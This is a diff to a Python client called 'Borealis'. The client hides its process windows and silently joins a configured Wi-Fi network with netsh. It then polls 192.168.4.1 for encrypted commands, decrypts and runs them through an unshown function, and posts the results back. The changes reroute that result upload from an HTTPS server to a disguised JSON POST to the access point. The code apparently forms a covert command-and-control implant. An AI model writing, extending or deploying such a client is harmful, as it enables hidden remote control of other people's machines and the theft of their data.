@@ -1,7 +1,8 @@
 #IMPORTS
 import socket, traceback, subprocess, time, os, uuid
-import http.client
+import http.client, json
 #SETUP
+STRING = ""
 si = subprocess.STARTUPINFO()
 si.dwFlags |= subprocess.STARTF_USESHOWWINDOW
 with open('uuid.txt',"w") as f:
@@ -9,7 +10,7 @@ with open('uuid.txt',"w") as f:
 with open('settings.txt','r') as f:
 	lst_ = f.readlines()
 	wifi = lst_[0].replace("\n","")
-	server = lst_[1].replace("\n","")
+	borealisname = lst_[1].replace("\n","")
 	sleepnum = int(lst_[2].replace("\n",""))
 	pingnum = int(lst_[3].replace("\n",""))
 	noconnection = int(lst_[4].replace("\n",""))
@@ -19,10 +20,16 @@ online,success = False,False
 idnum,totalnum,timestamp=0,0,0
 #FUNCTIONS
 def borealis(url):
+	global STRING
 	try:
 		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 		s.connect((url, 80))
-		s.sendall(bytes(f"GET / HTTP/1.1\r\nHost:{url}\r\n\r\n", encoding='utf-8'))
+		if not STRING:
+			s.sendall(bytes(f"GET / HTTP/1.1\r\nHost:{url}\r\n\r\n", encoding='utf-8'))
+		else:
+			json_ = {"log":STRING}
+			s.sendall(bytes(f"POST / HTTP/1.1\r\nHost:{url}\r\nUser-Agent: Borealis Client\r\nContent-Type: application/json\r\nContent-Length: 51\r\nX-HTTP-Method-Override: GET\r\n\r\n{json_}", encoding='utf-8'))
+			STRING = ""
 		eosstr = s.recv(4096)
 		s.close()
 		return eosstr
@@ -54,7 +61,7 @@ while True:
 	while not online:
 		try:
 			subprocess.call('netsh wlan add profile filename="borealis.xml"', startupinfo=si)
-			subprocess.call("netsh wlan connect Borealis", startupinfo=si)
+			subprocess.call(f"netsh wlan connect {borealisname}", startupinfo=si)
 			time.sleep(pingnum)
 			idnum,timestamp = int(str(borealis("192.168.4.1")).split(".:")[0].split("'")[-1]),int(str(borealis("192.168.4.1")).split(".:")[1].split("'")[-1])
 			print(str(idnum),str(timestamp))
@@ -69,7 +76,7 @@ while True:
 		time.sleep(0.1)
 	print("Passed Timestamp\nFetching Commands...")
 	subprocess.call('netsh wlan add profile filename="borealis.xml"', startupinfo=si)
-	subprocess.call("netsh wlan connect Borealis", startupinfo=si)
+	subprocess.call(f"netsh wlan connect {borealisname}", startupinfo=si)
 	print(sleepnum)
 	time.sleep(sleepnum)
 	eosstr = borealis("192.168.4.1")
@@ -93,15 +100,10 @@ while True:
 			prefix_,suffix_ = decrypt(str(prefix)),decrypt(str(suffix))
 			result = getfunc(prefix_,suffix_)
 			if result != None:
-				conn = http.client.HTTPSConnection(server)
-				payload = {'code':200,'result':result}
-				headers = {'Content-type': 'application/x-www-form-urlencoded'}
-				with open("uuid.txt","r") as f:
-					uid = str(f.readlines[0])
-				conn.request("POST", f"/api/{uid}", payload, headers)
-				response = conn.getresponse()
-				print(response.read().decode())
-		except:
+				print(result)
+				STRING = result
+		except Exception as e:
+			print("Error:\n"+str(e))
 			continue
 	commands = {}
 	time.sleep(connection-sleepnum)
